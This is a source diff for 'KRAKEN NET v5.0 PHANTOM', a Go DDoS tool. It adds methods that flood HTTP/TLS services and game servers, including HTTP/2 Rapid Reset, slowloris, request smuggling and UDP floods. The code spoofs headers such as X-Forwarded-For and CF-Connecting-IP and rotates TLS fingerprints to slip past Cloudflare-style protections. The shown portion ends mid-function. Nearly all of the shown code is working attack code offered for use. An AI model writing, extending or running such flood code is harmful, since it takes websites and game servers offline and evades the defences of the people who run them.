@@ -3,20 +3,18 @@ package main
 import (
 	"bufio"
 	"bytes"
-	"compress/gzip"
 	"context"
 	"crypto/tls"
 	"encoding/base64"
 	"encoding/binary"
-	"encoding/json"
 	"fmt"
 	"io"
 	"math/rand"
-	"mime/multipart"
 	"net"
 	"net/http"
 	"net/url"
 	"os"
+	"runtime"
 	"strconv"
 	"strings"
 	"sync"
@@ -27,10 +25,6 @@ import (
 	"golang.org/x/net/http2"
 	"golang.org/x/net/http2/hpack"
 )
-
-// ─────────────────────────────────────────────
-//  TERMINAL COLORS
-// ─────────────────────────────────────────────
 
 const (
 	Reset    = "\033[0m"
@@ -48,11 +42,13 @@ const (
 	BCyan    = "\033[1;36m"
 	BWhite   = "\033[1;37m"
 	BMagenta = "\033[1;35m"
+	BBlue    = "\033[1;34m"
+	Blue     = "\033[34m"
+	Orange   = "\033[38;5;208m"
+	BOrange  = "\033[1;38;5;208m"
+	Purple   = "\033[38;5;135m"
+	BPurple  = "\033[1;38;5;135m"
 )
-
-// ─────────────────────────────────────────────
-//  GLOBAL STATE
-// ─────────────────────────────────────────────
 
 var (
 	userAgents  []string
@@ -63,23 +59,20 @@ var (
 	workers     int
 	port        int
 	durationSec int
-	attackStart time.Time
 
 	totalSuccess int64
 	totalFail    int64
 	totalBytes   int64
 	totalReq     int64
+	peakRPS      float64
+	lastReq      int64
+	lastTick     time.Time
+	attackStart  time.Time
 
-	// per-method counters for live dashboard
-	methodCounters = make(map[string]*int64)
-	methodMu       sync.RWMutex
+	statsMu    sync.Mutex
+	rpsHistory [30]float64
+	rpsIdx     int
 )
-
-const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-
-// ─────────────────────────────────────────────
-//  DEFAULT DATA
-// ─────────────────────────────────────────────
 
 var defaultUserAgents = []string{
 	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
@@ -92,11 +85,12 @@ var defaultUserAgents = []string{
 	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
 	"Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
 	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
+	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
+	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
+	"Dalvik/2.1.0 (Linux; U; Android 14; SM-G998B Build/UP1A.231005.007)",
 	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
 	"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
-	"Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Build/UP1A.231005.007)",
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0",
-	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
+	"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36",
 }
 
 var defaultReferers = []string{
@@ -108,10 +102,10 @@ var defaultReferers = []string{
 	"https://t.co/",
 	"https://www.reddit.com/",
 	"https://github.com/",
-	"https://www.linkedin.com/",
 	"https://www.youtube.com/",
+	"https://www.twitter.com/",
 	"https://news.ycombinator.com/",
-	"https://twitter.com/",
+	"https://www.linkedin.com/",
 }
 
 var httpPaths = []string{
@@ -124,53 +118,23 @@ var httpPaths = []string{
 	"/.git/config", "/phpinfo.php", "/info.php", "/server-status",
 	"/xmlrpc.php", "/wp-json/wp/v2/users", "/.well-known/security.txt",
 	"/admin/config", "/administrator/", "/phpmyadmin/",
-	"/api/v3/", "/swagger/", "/docs/", "/actuator/", "/actuator/health",
-	"/actuator/env", "/_cat/indices", "/_nodes", "/console/",
+	"/actuator/health", "/actuator/env", "/swagger-ui/", "/api-docs",
+	"/v2/api-docs", "/_ah/health", "/readiness", "/liveness",
 }
 
 var apiEndpoints = []string{
 	"/api/v1/users", "/api/v2/data", "/api/graphql", "/api/v1/submit",
 	"/api/v1/auth", "/api/v1/search", "/api/v1/events", "/api/v1/webhook",
-	"/api/v3/stream", "/api/v2/upload", "/api/v1/report", "/api/v2/batch",
+	"/api/v3/users", "/graphql/v1", "/api/v1/upload", "/api/v2/auth",
 }
 
-var graphqlQueries = []string{
-	`{"query":"{ users { id name email posts { id title comments { id body author { id name } } } } }"}`,
-	`{"query":"{ allProducts { id name price category { id name subcategories { id name products { id } } } reviews { id rating comment user { id name } } } }"}`,
-	`{"query":"query deep { a { b { c { d { e { f { g { h { i { j { k { l { m { n { o { p { id } } } } } } } } } } } } } } } } }"}`,
-	`{"query":"{ search(query:\"test\") { ... on User { id } ... on Post { id } ... on Comment { id } ... on Product { id } } }"}`,
-}
-
-var bypassHeaders = []struct {
-	Key   string
-	Value string
-	Rand  bool
-}{
-	{"X-Forwarded-For", "127.0.0.1", true},
-	{"CF-Connecting-IP", "127.0.0.1", true},
-	{"X-Real-IP", "127.0.0.1", true},
-	{"True-Client-IP", "127.0.0.1", true},
-	{"X-Forwarded-Host", "localhost", false},
-	{"X-Host", "localhost", false},
-	{"X-Forwarded-Server", "localhost", false},
-	{"X-HTTP-Host-Override", "localhost", false},
-	{"Forwarded", "for=127.0.0.1;by=127.0.0.1", false},
-	{"X-Original-URL", "/", false},
-	{"X-Rewrite-URL", "/", false},
-	{"X-Forwarded-Proto", "https", false},
-	{"X-Forwarded-Port", "443", false},
-	{"X-Azure-ClientIP", "127.0.0.1", true},
-	{"X-Client-IP", "127.0.0.1", true},
-	{"X-ProxyUser-Ip", "127.0.0.1", true},
-}
-
-var acceptEncodings = []string{
-	"gzip, deflate, br",
-	"gzip, deflate",
-	"br",
-	"gzip",
-	"identity",
-	"*",
+var postPayloads = []string{
+	`{"username":"admin","password":"password"}`,
+	`{"email":"test@test.com","message":"hello"}`,
+	`{"data":"AAAAAAA","type":"test"}`,
+	`{"action":"login","user":"admin","pass":"admin123"}`,
+	strings.Repeat("A", 1024),
+	strings.Repeat("B", 2048),
 }
 
 var discordPayloads = [][]byte{
@@ -180,9 +144,79 @@ var discordPayloads = [][]byte{
 	[]byte("\xff\xff\xff\xffrcon \"\" \"\"\x00\x00\x00"),
 }
 
-// ─────────────────────────────────────────────
-//  BANNER + UI
-// ─────────────────────────────────────────────
+var tlsFingerprints = []struct {
+	CipherSuites []uint16
+	NextProtos   []string
+	MinVersion   uint16
+}{
+	{
+		CipherSuites: []uint16{
+			tls.TLS_AES_128_GCM_SHA256,
+			tls.TLS_AES_256_GCM_SHA384,
+			tls.TLS_CHACHA20_POLY1305_SHA256,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+		},
+		NextProtos: []string{"h2", "http/1.1"},
+		MinVersion: tls.VersionTLS13,
+	},
+	{
+		CipherSuites: []uint16{
+			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
+			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
+			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+		},
+		NextProtos: []string{"h2", "http/1.1"},
+		MinVersion: tls.VersionTLS12,
+	},
+	{
+		CipherSuites: []uint16{
+			tls.TLS_AES_256_GCM_SHA384,
+			tls.TLS_CHACHA20_POLY1305_SHA256,
+			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+		},
+		NextProtos: []string{"http/1.1"},
+		MinVersion: tls.VersionTLS12,
+	},
+}
+
+type bypassHeader struct {
+	Key   string
+	Value string
+	Rand  bool
+}
+
+var bypassHeaders = []bypassHeader{
+	{Key: "X-Forwarded-For", Value: "127.0.0.1", Rand: true},
+	{Key: "CF-Connecting-IP", Value: "127.0.0.1", Rand: true},
+	{Key: "X-Real-IP", Value: "127.0.0.1", Rand: true},
+	{Key: "True-Client-IP", Value: "127.0.0.1", Rand: true},
+	{Key: "X-Forwarded-Host", Value: "localhost"},
+	{Key: "X-Host", Value: "localhost"},
+	{Key: "X-Forwarded-Server", Value: "localhost"},
+	{Key: "X-HTTP-Host-Override", Value: "localhost"},
+	{Key: "Forwarded", Value: "for=127.0.0.1;by=127.0.0.1"},
+	{Key: "X-Original-URL", Value: "/"},
+	{Key: "X-Rewrite-URL", Value: "/"},
+	{Key: "X-Forwarded-Proto", Value: "https"},
+	{Key: "X-Forwarded-Port", Value: "443"},
+	{Key: "X-Cluster-Client-IP", Value: "127.0.0.1", Rand: true},
+	{Key: "X-Client-IP", Value: "127.0.0.1", Rand: true},
+}
+
+var acceptLanguages = []string{
+	"en-US,en;q=0.9",
+	"en-GB,en;q=0.9,en-US;q=0.8",
+	"zh-CN,zh;q=0.9,en;q=0.8",
+	"de-DE,de;q=0.9,en-US;q=0.8",
+	"fr-FR,fr;q=0.9,en;q=0.8",
+	"ja,en-US;q=0.9,en;q=0.8",
+	"ko-KR,ko;q=0.9,en;q=0.8",
+	"ru-RU,ru;q=0.9,en;q=0.8",
+}
+
+const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
 func printBanner() {
 	banner := `
@@ -216,8 +250,10 @@ func printBanner() {
 `
 	fmt.Println(RedLight + banner + Reset)
 	fmt.Println()
-	fmt.Println("   " + BCyan + "K R A K E N   N E T" + Reset + "   " + BWhite + "v5.0 PHANTOM TIER" + Reset)
-	fmt.Println("   " + Gray + "Layer 7 Full Spectrum | 28 Methods | by Piwiii2.0" + Reset)
+	fmt.Println("   " + BCyan + "K R A K E N   N E T" + Reset + "   " + BWhite + "v5.0 PHANTOM" + Reset)
+	fmt.Println("   " + Gray + "Full Spectrum Layer 7 | by Piwiii2.0" + Reset)
+	fmt.Printf("   %sRuntime:%s Go %s | %sCPU:%s %d cores\n",
+		Gray, Reset, runtime.Version(), Gray, Reset, runtime.NumCPU())
 	fmt.Println()
 }
 
@@ -230,8 +266,8 @@ func mhead(title, color string) {
 }
 
 func mrow(name, desc string) {
-	p1 := 18 - len(name)
-	p2 := 27 - len(desc)
+	p1 := 14 - len(name)
+	p2 := 31 - len(desc)
 	if p1 < 0 {
 		p1 = 0
 	}
@@ -247,7 +283,7 @@ func mfoot(color string) {
 
 func printMenu() {
 	fmt.Println()
-	mhead("TLS / HTTP CORE", Cyan)
+	mhead("TLS / HTTP", Cyan)
 	mrow("kraken", "TLS multi-request flood")
 	mrow("tls", "Standard TLS flood")
 	mrow("http-flood", "HTTP GET/POST flood")
@@ -258,55 +294,44 @@ func printMenu() {
 	mrow("cf-bypass", "Browser-like CF bypass")
 	mrow("range", "Range header abuse")
 	mrow("cookie-bomb", "500 cookies per request")
+	mrow("cache-bust", "Cache-busting param flood")
+	mrow("tls-exhaust", "TLS handshake exhaust")
+	mrow("phantom-get", "Rotating UA+IP+path GET")
 	mfoot(Cyan)
 	fmt.Println()
 	mhead("ADVANCED LAYER 7", Yellow)
 	mrow("slowloris", "Slow HTTP headers hold")
 	mrow("rudy", "R.U.D.Y slow POST body")
-	mrow("rapid-reset", "HTTP/2 Rapid Reset (CVE-2023-44487)")
-	mrow("h2-cont", "HTTP/2 CONTINUATION flood")
-	mrow("h2-priority", "HTTP/2 PRIORITY frame storm")
+	mrow("rapid-reset", "HTTP/2 Rapid Reset")
+	mrow("h2-cont", "HTTP/2 CONTINUATION")
 	mrow("chunk-post", "Chunked drip POST")
 	mrow("ws-flood", "WebSocket message flood")
-	mrow("malformed", "Malformed 8K URL GET")
-	mrow("tls-fragment", "TLS ClientHello fragmentation")
-	mrow("http-pipeline", "HTTP/1.1 pipeline flood")
+	mrow("malformed", "Malformed long URL")
+	mrow("http-smuggle", "HTTP request smuggling")
+	mrow("idle-h2", "H2 idle stream exhaust")
 	mfoot(Yellow)
 	fmt.Println()
-	mhead("EVASION + BYPASS", Magenta)
-	mrow("cache-bust", "Cache-busting param rotation")
-	mrow("cache-poison", "Cache poisoning headers")
-	mrow("origin-spoof", "Origin/Host header spoofing")
-	mrow("etag-storm", "ETag/If-None-Match exhaust")
-	mrow("accept-flood", "Accept-* header mutation")
-	mrow("gzip-bomb", "Gzip inflate exhaust")
-	mrow("jwt-spray", "JWT brute token spray")
-	mrow("graphql-depth", "GraphQL deep query flood")
-	mrow("multipart-exhaust", "Multipart form exhaust")
-	mrow("retry-after", "Retry-After abuse loop")
-	mfoot(Magenta)
-	fmt.Println()
-	mhead("UDP", Red)
+	mhead("UDP", Magenta)
 	mrow("udp-discord", "Quake3 query flood")
 	mrow("udp-bypass", "Random payload flood")
 	mrow("udp-gbps", "High bandwidth flood")
+	mrow("udp-amp", "Reflection-style flood")
 	mrow("fivem", "FiveM getinfo flood")
-	mfoot(Red)
+	mfoot(Magenta)
 	fmt.Println()
 	mhead("GAME", Green)
 	mrow("minecraft", "Minecraft handshake flood")
+	mrow("gmod", "Garry's Mod query flood")
+	mrow("cs2", "CS2 A2S_INFO flood")
 	mfoot(Green)
 	fmt.Println()
 	mhead("ULTIMATE", RedLight)
-	mrow("hybrid", "TLS+API+WS+H2+GraphQL+Cache")
-	mrow("apocalypse", "All 28 vectors maximum")
+	mrow("hybrid", "TLS + API + WS + H2 reset")
+	mrow("apocalypse", "All vectors maximum")
+	mrow("phantom", "Rotating all methods auto")
 	mfoot(RedLight)
 	fmt.Println()
 }
-
-// ─────────────────────────────────────────────
-//  HELPERS
-// ─────────────────────────────────────────────
 
 func loadListFromFile(filename string) []string {
 	file, err := os.Open(filename)
@@ -334,36 +359,32 @@ func randomFromList(list []string, fallback string) string {
 }
 
 func randomUserAgent() string {
-	agents := userAgents
-	if len(agents) == 0 {
-		agents = defaultUserAgents
-	}
-	return agents[rand.Intn(len(agents))]
+	return randomFromList(userAgents, defaultUserAgents[rand.Intn(len(defaultUserAgents))])
 }
 
 func randomReferer() string {
-	refs := referers
-	if len(refs) == 0 {
-		refs = defaultReferers
-	}
-	return refs[rand.Intn(len(refs))]
+	return randomFromList(referers, defaultReferers[rand.Intn(len(defaultReferers))])
 }
 
 func randomMethod() string {
-	switch rand.Intn(10) {
+	switch rand.Intn(12) {
 	case 0, 1:
 		return "POST"
 	case 2:
 		return "HEAD"
 	case 3:
+		return "OPTIONS"
+	case 4:
 		return "PUT"
+	case 5:
+		return "PATCH"
 	default:
 		return "GET"
 	}
 }
 
 func randomPath() string {
-	if rand.Intn(3) != 0 {
+	if rand.Intn(2) == 0 {
 		return httpPaths[rand.Intn(len(httpPaths))]
 	}
 	b := make([]byte, rand.Intn(20)+5)
@@ -371,6 +392,10 @@ func randomPath() string {
 		b[i] = charset[rand.Intn(len(charset))]
 	}
 	return "/" + string(b)
+}
+
+func randomPostPayload() string {
+	return postPayloads[rand.Intn(len(postPayloads))]
 }
 
 func randomBypassHeader() (string, string) {
@@ -382,7 +407,16 @@ func randomBypassHeader() (string, string) {
 }
 
 func randomIP() string {
-	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(223)+1, rand.Intn(255), rand.Intn(255), rand.Intn(254)+1)
+	return fmt.Sprintf("%d.%d.%d.%d",
+		rand.Intn(223)+1, rand.Intn(255), rand.Intn(255), rand.Intn(254)+1)
+}
+
+func randomIPv6() string {
+	groups := make([]string, 8)
+	for i := range groups {
+		groups[i] = fmt.Sprintf("%04x", rand.Intn(65536))
+	}
+	return strings.Join(groups, ":")
 }
 
 func randString(n int) string {
@@ -396,6 +430,21 @@ func randString(n int) string {
 func randEmail() string {
 	domains := []string{"gmail.com", "yahoo.com", "outlook.com", "proton.me", "mail.ru", "example.com"}
 	return randString(8+rand.Intn(12)) + "@" + domains[rand.Intn(len(domains))]
+}
+
+func randomAcceptLanguage() string {
+	return acceptLanguages[rand.Intn(len(acceptLanguages))]
+}
+
+func randomTLSConfig(serverName string) *tls.Config {
+	fp := tlsFingerprints[rand.Intn(len(tlsFingerprints))]
+	return &tls.Config{
+		ServerName:         serverName,
+		InsecureSkipVerify: true,
+		CipherSuites:       fp.CipherSuites,
+		NextProtos:         fp.NextProtos,
+		MinVersion:         fp.MinVersion,
+	}
 }
 
 func formatBytes(b float64) string {
@@ -476,33 +525,12 @@ func dialTarget(host, p string) (net.Conn, error) {
 	return net.DialTimeout("tcp", addr, 5*time.Second)
 }
 
-func generatePayload(size int) []byte {
-	payload := make([]byte, size)
-	rand.Read(payload)
-	return payload
-}
-
-func trackMethod(name string) {
-	methodMu.Lock()
-	if _, ok := methodCounters[name]; !ok {
-		var c int64
-		methodCounters[name] = &c
-	}
-	methodMu.Unlock()
-	methodMu.RLock()
-	atomic.AddInt64(methodCounters[name], 1)
-	methodMu.RUnlock()
-}
-
-// ─────────────────────────────────────────────
-//  HTTP CLIENTS
-// ─────────────────────────────────────────────
-
 func newHTTPClientTLSWithProxy(proxyStr string, conns int) *http.Client {
 	var proxyURL *url.URL
 	if proxyStr != "" {
 		proxyURL, _ = url.Parse(proxyStr)
 	}
+	fp := tlsFingerprints[rand.Intn(len(tlsFingerprints))]
 	tr := &http.Transport{
 		Proxy:               http.ProxyURL(proxyURL),
 		MaxIdleConns:        conns * 4,
@@ -513,8 +541,9 @@ func newHTTPClientTLSWithProxy(proxyStr string, conns int) *http.Client {
 		ForceAttemptHTTP2:   true,
 		TLSClientConfig: &tls.Config{
 			InsecureSkipVerify: true,
-			NextProtos:         []string{"h2", "http/1.1"},
-			MinVersion:         tls.VersionTLS12,
+			CipherSuites:       fp.CipherSuites,
+			NextProtos:         fp.NextProtos,
+			MinVersion:         fp.MinVersion,
 		},
 		DialContext: (&net.Dialer{
 			Timeout:   5 * time.Second,
@@ -547,9 +576,107 @@ func newNoTimeoutClient() *http.Client {
 	return &c
 }
 
-// ─────────────────────────────────────────────
-//  PAYLOAD GENERATORS
-// ─────────────────────────────────────────────
+func setCommonHeaders(req *http.Request) {
+	req.Header.Set("User-Agent", randomUserAgent())
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+	req.Header.Set("Accept-Language", randomAcceptLanguage())
+	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+	req.Header.Set("Cache-Control", "no-cache")
+	req.Header.Set("Referer", randomReferer())
+	req.Header.Set("Connection", "keep-alive")
+	req.Header.Set("Upgrade-Insecure-Requests", "1")
+	req.Header.Set("Sec-Fetch-Dest", "document")
+	req.Header.Set("Sec-Fetch-Mode", "navigate")
+	req.Header.Set("Sec-Fetch-Site", "none")
+	req.Header.Set("Sec-Fetch-User", "?1")
+	req.Header.Set("Pragma", "no-cache")
+	hk, hv := randomBypassHeader()
+	req.Header.Set(hk, hv)
+	req.Header.Set("Cookie", "session="+randString(32)+"; _ga="+randString(12)+"; _gid="+randString(10))
+	if rand.Intn(3) == 0 {
+		req.Header.Set("X-Forwarded-For", randomIP()+", "+randomIP()+", "+randomIP())
+	}
+}
+
+func sendTLSRequest(client *http.Client, baseURL string) bool {
+	method := randomMethod()
+	path := randomPath()
+	var body io.Reader
+	if method == "POST" || method == "PUT" || method == "PATCH" {
+		body = strings.NewReader(randomPostPayload())
+	}
+	req, err := http.NewRequest(method, baseURL+path, body)
+	if err != nil {
+		return false
+	}
+	setCommonHeaders(req)
+	if body != nil {
+		req.Header.Set("Content-Type", "application/json")
+	}
+	atomic.AddInt64(&totalReq, 1)
+	resp, err := client.Do(req)
+	if err != nil {
+		return false
+	}
+	n, _ := io.Copy(io.Discard, resp.Body)
+	resp.Body.Close()
+	atomic.AddInt64(&totalBytes, n)
+	return resp.StatusCode < 500
+}
+
+func cacheBustRequest(client *http.Client, baseURL string) bool {
+	bust := fmt.Sprintf("?_=%d&cb=%s&v=%d", time.Now().UnixNano(), randString(8), rand.Intn(999999))
+	req, err := http.NewRequest("GET", baseURL+randomPath()+bust, nil)
+	if err != nil {
+		return false
+	}
+	setCommonHeaders(req)
+	req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+	req.Header.Set("Pragma", "no-cache")
+	req.Header.Set("Expires", "0")
+	atomic.AddInt64(&totalReq, 1)
+	resp, err := client.Do(req)
+	if err != nil {
+		return false
+	}
+	n, _ := io.Copy(io.Discard, resp.Body)
+	resp.Body.Close()
+	atomic.AddInt64(&totalBytes, n)
+	return resp.StatusCode < 500
+}
+
+func phantomGetRequest(client *http.Client, baseURL string) bool {
+	methods := []string{"GET", "HEAD", "OPTIONS"}
+	method := methods[rand.Intn(len(methods))]
+	path := randomPath()
+	if rand.Intn(4) == 0 {
+		path += "?" + randString(5) + "=" + randString(10)
+	}
+	req, err := http.NewRequest(method, baseURL+path, nil)
+	if err != nil {
+		return false
+	}
+	req.Header.Set("User-Agent", randomUserAgent())
+	req.Header.Set("Accept-Language", randomAcceptLanguage())
+	req.Header.Set("X-Forwarded-For", randomIP())
+	req.Header.Set("CF-Connecting-IP", randomIP())
+	req.Header.Set("True-Client-IP", randomIP())
+	if rand.Intn(2) == 0 {
+		req.Header.Set("X-Forwarded-For",
+			fmt.Sprintf("%s, %s, %s", randomIP(), randomIP(), randomIP()))
+	}
+	req.Header.Set("Referer", randomReferer())
+	req.Header.Set("Cookie", "session="+randString(24))
+	atomic.AddInt64(&totalReq, 1)
+	resp, err := client.Do(req)
+	if err != nil {
+		return false
+	}
+	n, _ := io.Copy(io.Discard, resp.Body)
+	resp.Body.Close()
+	atomic.AddInt64(&totalBytes, n)
+	return resp.StatusCode < 500
+}
 
 func genAPIPayload() string {
 	generators := []func() string{
@@ -595,73 +722,28 @@ func genAPIPayload() string {
 				randString(8), randString(5), randString(1000+rand.Intn(4000)),
 			)
 		},
+		func() string {
+			return fmt.Sprintf(
+				`{"email":"%s","password":"%s","mfa_code":"%06d","device_id":"%s","fingerprint":"%s"}`,
+				randEmail(), randString(16+rand.Intn(32)), rand.Intn(999999), randString(36), randString(64),
+			)
+		},
+		func() string {
+			var sb strings.Builder
+			n := 100 + rand.Intn(500)
+			sb.WriteString(`{"batch":[`)
+			for i := 0; i < n; i++ {
+				if i > 0 {
+					sb.WriteByte(',')
+				}
+				fmt.Fprintf(&sb, `{"op":"upsert","table":"users","data":{"id":%d,"payload":"%s"}}`,
+					rand.Intn(9999999), randString(100+rand.Intn(900)))
+			}
+			sb.WriteString(`]}`)
+			return sb.String()
+		},
 	}
 	return generators[rand.Intn(len(generators))]()
-}
-
-func genGzipBombPayload() []byte {
-	// generates a gzip payload that expands to ~1MB on decompression
-	inner := bytes.Repeat([]byte("A"), 1024*1024)
-	var buf bytes.Buffer
-	gz := gzip.NewWriter(&buf)
-	gz.Write(inner)
-	gz.Close()
-	return buf.Bytes()
-}
-
-func genFakeJWT() string {
-	header := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"HS256","typ":"JWT"}`))
-	payload := base64.RawURLEncoding.EncodeToString([]byte(fmt.Sprintf(
-		`{"sub":"%d","iat":%d,"exp":%d,"role":"admin","jti":"%s"}`,
-		rand.Intn(9999999), time.Now().Unix(), time.Now().Add(24*time.Hour).Unix(), randString(32),
-	)))
-	sig := randString(43)
-	return header + "." + payload + "." + sig
-}
-
-// ─────────────────────────────────────────────
-//  ── CORE METHODS ──
-// ─────────────────────────────────────────────
-
-func sendTLSRequest(client *http.Client, baseURL string) bool {
-	method := randomMethod()
-	path := randomPath()
-	var body io.Reader
-	if method == "POST" || method == "PUT" {
-		body = strings.NewReader(genAPIPayload())
-	}
-	req, err := http.NewRequest(method, baseURL+path, body)
-	if err != nil {
-		return false
-	}
-	req.Header.Set("User-Agent", randomUserAgent())
-	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
-	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
-	req.Header.Set("Accept-Encoding", acceptEncodings[rand.Intn(len(acceptEncodings))])
-	req.Header.Set("Cache-Control", "no-cache")
-	req.Header.Set("Referer", randomReferer())
-	req.Header.Set("Connection", "keep-alive")
-	req.Header.Set("Upgrade-Insecure-Requests", "1")
-	req.Header.Set("Sec-Fetch-Dest", "document")
-	req.Header.Set("Sec-Fetch-Mode", "navigate")
-	req.Header.Set("Sec-Fetch-Site", "none")
-	req.Header.Set("Sec-Fetch-User", "?1")
-	if body != nil {
-		req.Header.Set("Content-Type", "application/json")
-	}
-	hk, hv := randomBypassHeader()
-	req.Header.Set(hk, hv)
-	req.Header.Set("Cookie", "session="+randString(32)+"; _ga="+randString(12)+"; csrf="+randString(24))
-	atomic.AddInt64(&totalReq, 1)
-	trackMethod("kraken")
-	resp, err := client.Do(req)
-	if err != nil {
-		return false
-	}
-	io.Copy(io.Discard, resp.Body)
-	resp.Body.Close()
-	atomic.AddInt64(&totalBytes, resp.ContentLength)
-	return resp.StatusCode < 500
 }
 
 func apiFloodRequest(client *http.Client, targetURL string) bool {
@@ -678,9 +760,9 @@ func apiFloodRequest(client *http.Client, targetURL string) bool {
 	req.Header.Set("Authorization", "Bearer "+randString(64))
 	req.Header.Set("Origin", targetURL)
 	req.Header.Set("Referer", randomReferer())
+	req.Header.Set("Accept-Language", randomAcceptLanguage())
 	atomic.AddInt64(&totalReq, 1)
 	atomic.AddInt64(&totalBytes, int64(len(body)))
-	trackMethod("api-flood")
 	resp, err := client.Do(req)
 	if err != nil {
 		return false
@@ -696,12 +778,12 @@ func headerFloodRequest(client *http.Client, targetURL string) bool {
 		return false
 	}
 	req.Header.Set("User-Agent", randomUserAgent())
-	n := 80 + rand.Intn(120)
+	n := 50 + rand.Intn(50)
 	for i := 0; i < n; i++ {
-		req.Header.Set("X-"+randString(8+rand.Intn(8)), randString(512+rand.Intn(1024)))
+		req.Header.Set("X-"+randString(8), randString(512+rand.Intn(512)))
 	}
+	req.Header.Set("Cookie", strings.Repeat("x="+randString(50)+"; ", 30))
 	atomic.AddInt64(&totalReq, 1)
-	trackMethod("header-flood")
 	resp, err := client.Do(req)
 	if err != nil {
 		return false
@@ -714,22 +796,25 @@ func headerFloodRequest(client *http.Client, targetURL string) bool {
 func mixPostRequest(client *http.Client, targetURL string) bool {
 	var body string
 	var contentType string
-	switch rand.Intn(5) {
+	switch rand.Intn(6) {
 	case 0:
 		contentType = "application/json"
-		body = fmt.Sprintf(`{"data":"%s","id":%d,"token":"%s"}`, randString(1024), rand.Intn(9999), randString(64))
+		body = fmt.Sprintf(`{"data":"%s","id":%d,"token":"%s"}`, randString(500), rand.Intn(9999), randString(32))
 	case 1:
 		contentType = "application/xml"
-		body = fmt.Sprintf(`<?xml version="1.0"?><root><data>%s</data><id>%d</id><token>%s</token></root>`, randString(1024), rand.Intn(9999), randString(64))
+		body = fmt.Sprintf(`<?xml version="1.0"?><root><data>%s</data><id>%d</id></root>`, randString(500), rand.Intn(9999))
 	case 2:
 		contentType = "application/x-www-form-urlencoded"
-		body = "data=" + randString(1024) + "&id=" + strconv.Itoa(rand.Intn(9999)) + "&token=" + randString(64)
+		body = "data=" + randString(500) + "&id=" + strconv.Itoa(rand.Intn(9999))
 	case 3:
 		contentType = "text/plain"
-		body = randString(2048)
+		body = randString(800)
 	case 4:
-		contentType = "application/octet-stream"
-		body = string(generatePayload(2048))
+		contentType = "multipart/form-data; boundary=----" + randString(16)
+		body = "------" + randString(16) + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"x.txt\"\r\n\r\n" + randString(2000) + "\r\n------" + randString(16) + "--"
+	case 5:
+		contentType = "application/graphql"
+		body = fmt.Sprintf(`{ user(id: "%s") { name email bio } }`, randString(16))
 	}
 	req, err := http.NewRequest("POST", targetURL+randomPath(), strings.NewReader(body))
 	if err != nil {
@@ -741,7 +826,6 @@ func mixPostRequest(client *http.Client, targetURL string) bool {
 	req.Header.Set("Referer", randomReferer())
 	atomic.AddInt64(&totalReq, 1)
 	atomic.AddInt64(&totalBytes, int64(len(body)))
-	trackMethod("mixpost")
 	resp, err := client.Do(req)
 	if err != nil {
 		return false
@@ -756,14 +840,14 @@ func cfBypassRequest(client *http.Client, targetURL string) bool {
 	if strings.Contains(targetURL, "?") {
 		sep = "&"
 	}
-	fullURL := targetURL + sep + "q=" + randString(15) + "&p=" + strconv.Itoa(rand.Intn(9999)) + "&_=" + strconv.FormatInt(time.Now().UnixNano(), 10)
+	fullURL := targetURL + sep + "q=" + randString(15) + "&p=" + strconv.Itoa(rand.Intn(9999))
 	req, err := http.NewRequest("GET", fullURL, nil)
 	if err != nil {
 		return false
 	}
 	req.Header.Set("User-Agent", randomUserAgent())
 	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
-	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
+	req.Header.Set("Accept-Language", randomAcceptLanguage())
 	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
 	req.Header.Set("Connection", "keep-alive")
 	req.Header.Set("Upgrade-Insecure-Requests", "1")
@@ -773,9 +857,8 @@ func cfBypassRequest(client *http.Client, targetURL string) bool {
 	req.Header.Set("Sec-Fetch-User", "?1")
 	req.Header.Set("Cache-Control", "max-age=0")
 	req.Header.Set("Referer", randomReferer())
